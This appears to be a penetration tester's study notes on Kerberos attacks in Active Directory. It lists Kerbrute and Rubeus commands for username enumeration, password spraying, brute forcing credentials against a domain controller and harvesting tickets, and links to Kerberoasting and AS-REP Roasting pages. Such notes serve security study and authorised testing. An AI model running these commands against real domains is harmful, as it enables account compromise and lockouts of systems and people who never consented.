
<aside>
Kerberos communication requires a full qualified name (FQDN) for performing actions. If you try to access a machine by the IP address. It’ll use NTLM not Kerberos.
</aside>

## Tools

- Kerbrute
- Rubeus
- impacket-GetUserSPNs

## Username Enumeration, Password Spray and More

```bash
kerbrute userenum --dc $DC_IP --domain $DOMAIN $USERNAME_LIST
kerbrute userenum --dc $DC_IP --domain $DOMAIN wook.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

# credslist contains [user]:[pass] on each line
kerbrute passwordspray --dc $DC_IP --domain $DOMAIN $USERNAME_LIST $PWD
kerbrute bruteuser --dc $DC_IP --domain [domain] [passlist] [user]
kerbrute bruteforce --dc [DC_IP] --domain [domain] [credslist]

# password spraying
rubeus.exe brute /password:[password] /noticket

# harvesting tickets
rubeus.exe harvest /interval:30

# wordlists
https://github.com/insidetrust/statistically-likely-usernames
```

## Attacks

[Exploitation](https://www.notion.so/Exploitation-2e256e0e1b6a80cd88e7ced1f2bd26b4?pvs=21) 

- [Kerberoasting](https://www.notion.so/Kerberoasting-2e256e0e1b6a8062a1d9f0ae9a48da22?pvs=21)
- [AS-REP Roasting](https://www.notion.so/AS-REP-Roasting-2e256e0e1b6a80bb979ade993b3232fe?pvs=21)